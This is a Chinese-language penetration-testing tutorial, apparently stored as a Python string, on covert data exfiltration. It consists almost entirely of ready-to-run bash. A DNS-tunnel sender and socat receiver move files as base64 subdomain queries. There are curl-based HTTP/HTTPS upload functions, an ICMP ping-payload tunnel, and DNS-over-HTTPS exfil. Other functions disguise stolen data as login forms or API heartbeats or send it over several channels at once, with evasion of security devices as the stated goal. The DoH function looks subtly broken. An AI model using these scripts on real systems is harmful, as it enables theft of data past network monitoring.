, """# 数据外传：DNS/HTTP/ICMP隧道

## 概述

数据外传（Exfiltration）是渗透测试中将目标系统数据安全传回攻击者控制环境的关键步骤。本文详细介绍利用 DNS、HTTP、ICMP 协议进行隐蔽数据传输的 bash 实现方案。

## 核心理念

- **隐蔽性优先**：选择不容易被安全设备检测的传输方式
- **可靠性保证**：确保数据完整传输，支持断点续传
- **加密传输**：对外传数据进行加密保护
- **流量伪装**：模拟正常业务流量特征

---

## 1. DNS 隧道数据外传

### 1.1 DNS 隧道原理

DNS 隧道将数据编码后嵌入 DNS 查询请求中，通过 DNS 服务器中转实现数据传输。由于大多数网络环境允许 DNS 流量出站，这种方式具有极强的穿透性。

### 1.2 基础 DNS 外传脚本

```bash
#!/usr/bin/env bash
# DNS 数据外传工具
set -euo pipefail

RED='\\033[0;31m'; GREEN='\\033[0;32m'; BLUE='\\033[0;34m'; NC='\\033[0m'
log_info()    { echo -e "${BLUE}[*]${NC} $*"; }
log_success() { echo -e "${GREEN}[+]${NC} $*"; }
log_error()   { echo -e "${RED}[-]${NC} $*" >&2; }

DOMAIN="" FILE="" CHUNK_SIZE=60 DELAY=0.1 VERBOSE=false

encode_data() {
    local data="$1"
    echo -n "$data" | base64 | tr '+/' '-_' | tr -d '='
}

send_dns_query() {
    local subdomain="$1" domain="$2"
    local full_domain="${subdomain}.${domain}"
    [[ "$VERBOSE" == true ]] && log_info "查询: $full_domain"
    dig +short "$full_domain" A >/dev/null 2>&1 || true
    nslookup "$full_domain" >/dev/null 2>&1 || true
    sleep "$DELAY"
}

chunk_file() {
    local file="$1" chunk_size="$2"
    local total_chunks chunk_num=0
    total_chunks=$(($(wc -c < "$file") / chunk_size + 1))
    log_info "文件分块: ${total_chunks} 个块"
    while IFS= read -r -n "$chunk_size" chunk; do
        ((chunk_num++))
        log_info "发送块 ${chunk_num}/${total_chunks}"
        local encoded
        encoded=$(encode_data "$chunk")
        send_dns_query "$encoded" "$DOMAIN"
    done < "$file"
}

transfer_file() {
    local file="$1" domain="$2"
    [[ ! -f "$file" ]] && { log_error "文件不存在: $file"; return 1; }
    local filename filesize md5
    filename=$(basename "$file")
    filesize=$(wc -c < "$file")
    md5=$(md5sum "$file" | awk '{print $1}')
    local header="${filename}:${filesize}:${md5}"
    local encoded_header
    encoded_header=$(encode_data "$header")
    log_info "发送文件头: $header"
    send_dns_query "H${encoded_header}" "$domain"
    chunk_file "$file" "$CHUNK_SIZE"
    send_dns_query "END${md5}" "$domain"
    log_success "文件传输完成: $file"
}

main() {
    while [[ $# -gt 0 ]]; do
        case "$1" in
            -d|--domain) DOMAIN="$2"; shift 2 ;;
            -f|--file)   FILE="$2"; shift 2 ;;
            -c|--chunk)  CHUNK_SIZE="$2"; shift 2 ;;
            -D|--delay)  DELAY="$2"; shift 2 ;;
            -v|--verbose) VERBOSE=true; shift ;;
            *) shift ;;
        esac
    done
    [[ -z "$DOMAIN" ]] && { log_error "必须指定域名"; exit 1; }
    [[ -z "$FILE" ]] && { log_error "必须指定文件"; exit 1; }
    transfer_file "$FILE" "$DOMAIN"
}
main "$@"
```

### 1.3 DNS 数据接收端

```bash
setup_dns_server() {
    local listen_port="${1:-5353}"
    local output_dir="${2:-/tmp/exfil}"
    mkdir -p "$output_dir"
    log_info "启动 DNS 监听端口 $listen_port..."
    while true; do
        socat UDP-LISTEN:"$listen_port",reuseaddr,fork \\
            SYSTEM:'echo "$(date +%Y-%m-%d\\ %H:%M:%S) $(cat)" >> '"$output_dir"'/dns_log.txt'
    done
}

parse_dns_log() {
    local log_file="$1"
    awk '{print $NF}' "$log_file" | sed 's/\\./\\n/g' | head -n -1 | base64 -d 2>/dev/null
}
```

---

## 2. HTTP 外传

### 2.1 HTTP POST 外传

```bash
exfil_http_post() {
    local file="$1" url="$2"
    local filename
    filename=$(basename "$file")
    log_info "HTTP POST 外传: $file -> $url"
    local response
    response=$(curl -s -o /dev/null -w "%{http_code}" \\
        -X POST -F "file=@${file}" -F "name=${filename}" \\
        --max-time 30 "$url" 2>/dev/null) || true
    [[ "$response" =~ ^(200|201)$ ]] && { log_success "外传成功"; return 0; }
    log_error "外传失败 (HTTP $response)"
    return 1
}
```

### 2.2 HTTP GET 外传

```bash
exfil_http_get() {
    local data="$1" url="$2"
    local encoded
    encoded=$(echo -n "$data" | base64 | tr -d '\\n')
    local chunk_size=200 total=${#encoded} offset=0
    while (( offset < total )); do
        local chunk="${encoded:$offset:$chunk_size}"
        curl -s -o /dev/null "${url}?d=${chunk}&o=${offset}" 2>/dev/null || true
        ((offset += chunk_size))
        sleep 0.05
    done
}
```

### 2.3 HTTPS 加密外传

```bash
exfil_https() {
    local file="$1" url="$2"
    local response
    response=$(curl -s -o /dev/null -w "%{http_code}" \\
        -X POST -F "data=@${file}" --max-time 60 -k \\
        -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)" \\
        "$url" 2>/dev/null) || true
    [[ "$response" =~ ^(200|201)$ ]] && return 0 || return 1
}
```

---

## 3. ICMP 隧道

```bash
ICMP_SEQ=0 DELAY=0.05

encode_icmp_data() {
    local data="$1"
    echo -n "$data" | base64 | tr -d '\\n'
}

send_icmp_packet() {
    local target="$1" data="$2"
    ((ICMP_SEQ++))
    local hex_data
    hex_data=$(echo -n "$data" | xxd -p | tr -d '\\n')
    ping -c 1 -p "${hex_data:0:48}" -W 1 "$target" >/dev/null 2>&1 || true
    sleep "$DELAY"
}

exfil_icmp() {
    local file="$1" target="$2" chunk_size=32
    [[ ! -f "$file" ]] && { log_error "文件不存在"; return 1; }
    local filename filesize md5
    filename=$(basename "$file")
    filesize=$(wc -c < "$file")
    md5=$(md5sum "$file" | awk '{print $1}')
    log_info "ICMP 隧道外传: $file -> $target"
    send_icmp_packet "$target" "H:${filename}:${filesize}:${md5}"
    local offset=0
    while (( offset < filesize )); do
        local chunk
        chunk=$(dd if="$file" bs=1 skip="$offset" count="$chunk_size" 2>/dev/null)
        local encoded
        encoded=$(encode_icmp_data "$chunk")
        log_info "发送偏移 $offset / $filesize"
        send_icmp_packet "$target" "D:${offset}:${encoded}"
        ((offset += chunk_size))
    done
    send_icmp_packet "$target" "E:${md5}"
    log_success "ICMP 外传完成"
}
```

---

## 4. 高级隐蔽通道

### 4.1 DNS-over-HTTPS 外传

```bash
doh_exfil() {
    local data="$1" doh_server="${2:-https://1.1.1.1/dns-query}" domain="$3"
    local encoded
    encoded=$(echo -n "$data" | base64 | tr -d '\\n')
    curl -s -o /dev/null \\
        -H "Content-Type: application/dns-message" \\
        --data-binary "@${encoded}.${domain}" \\
        "$doh_server" 2>/dev/null || true
}
```

### 4.2 流量伪装

```bash
disguised_exfil() {
    local data="$1" target_url="$2"
    local form_data="username=$(python3 -c "import urllib.parse;print(urllib.parse.quote('$data'))")&password=placeholder&action=login"
    curl -s -o /dev/null \\
        -X POST -H "Content-Type: application/x-www-form-urlencoded" \\
        -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)" \\
        -d "$form_data" "$target_url" 2>/dev/null || true
}

api_disguised_exfil() {
    local data="$1" target_url="$2"
    local json_payload="{\\\"action\\\":\\\"heartbeat\\\",\\\"client_id\\\":\\\"$(echo "$data" | base64)\\\",\\\"timestamp\\\":$(date +%s)}"
    curl -s -o /dev/null \\
        -X POST -H "Content-Type: application/json" \\
        -d "$json_payload" "$target_url" 2>/dev/null || true
}
```

### 4.3 多协议冗余传输

```bash
redundant_exfil() {
    local file="$1" dns_domain="$2" http_url="$3" icmp_target="$4"
    log_info "启动多协议冗余传输..."
    (transfer_file "$file" "$dns_domain") &
    (exfil_http_post "$file" "$http_url") &
    (exfil_icmp "$file" "$icmp_target") &
    wait
    log_success "多协议传输完成"
}
```

---

## 总结

本文介绍了 DNS/HTTP/ICMP 三种隧道数据外传技术的 bash 实现，包括 DNS 隧道编码传输、HTTP POST/GET/HTTPS 外传、ICMP 数据封装，以及 DoH、流量伪装和多协议冗余等高级隐蔽通道技术。
"""